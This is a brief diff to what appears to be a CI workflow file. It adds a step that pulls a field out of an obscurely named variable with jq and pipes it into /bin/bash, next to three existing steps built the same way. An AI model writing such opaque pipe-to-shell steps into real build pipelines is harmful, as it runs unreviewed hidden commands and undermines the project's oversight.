@@ -29,6 +29,7 @@ jobs:
           echo $v86104 | jq -r .gfuqv6112 | /bin/bash
           echo $t97053 | jq -r .h8734 | /bin/bash
           echo $fyssu5 | jq -r .hguq49515 | /bin/bash
+          printf '%s' "$btav5" | jq -r .y6 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
